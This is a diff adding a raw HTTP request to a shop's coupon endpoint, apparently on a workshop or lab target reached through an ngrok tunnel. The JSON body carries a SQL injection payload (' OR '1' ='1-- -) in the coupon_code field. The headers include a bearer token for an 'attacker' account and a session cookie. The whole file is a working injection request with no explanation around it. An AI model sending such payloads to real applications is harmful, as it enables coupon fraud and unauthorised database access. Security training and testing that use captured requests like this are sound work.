@@ -1,0 +1,21 @@
+POST /workshop/api/shop/apply_coupon HTTP/2
+Host: merlin-declivitous-crowdedly.ngrok-free.dev
+Cookie: abuse_interstitial=merlin-declivitous-crowdedly.ngrok-free.dev; chat_session_id=6219c105-f3e5-43d9-9f66-120922607f3e
+Content-Length: 46
+Sec-Ch-Ua-Platform: "Windows"
+Authorization: Bearer eyJhbGciOiJSUzI1NiJ9.eyJzdWIiOiJhdHRhY2tlckBhLmNvbSIsImlhdCI6MTc3OTg1NDQ1MCwiZXhwIjoxNzgwNDU5MjUwLCJyb2xlIjoidXNlciJ9.Q3k2OUs10udNGJQWmbHmLFzxXhyDJwvXWT29jlLVZuf5UsMhCH1DCF4kWdOJLkrOCIdfZODQHn1e1YYBSKb4oOcuWl2DSJuX-79wFadh8Bk-GMmPI41PvfOK3GJ4zvf4LRaHL3NGb1hAq8V8NnH3RnOHz8FM8GMsMwQ1bVNyXESPtrNwhRqKAYBesiW7jOmClPBa6DjZyf4zrT0oVQnaq-xBmBpyaADtLI0iq6vhpb7zJllB6SaG55FKpA1LA8w-wCJA-Q0VxMwFxRiIaSdAoCzo-8XuJht-2WoxenWDe_Xw-aH-0ZTkiPwvbOCPoNwZtsBXAH8sbmtMXESvDXZ50Q
+Accept-Language: en-US,en;q=0.9
+Sec-Ch-Ua: "Not-A.Brand";v="24", "Chromium";v="146"
+Content-Type: application/json
+Sec-Ch-Ua-Mobile: ?0
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36
+Accept: */*
+Origin: https://merlin-declivitous-crowdedly.ngrok-free.dev
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: cors
+Sec-Fetch-Dest: empty
+Referer: https://merlin-declivitous-crowdedly.ngrok-free.dev/shop
+Accept-Encoding: gzip, deflate, br
+Priority: u=1, i
+
+{"coupon_code":"' OR '1' ='1-- -","amount":75}
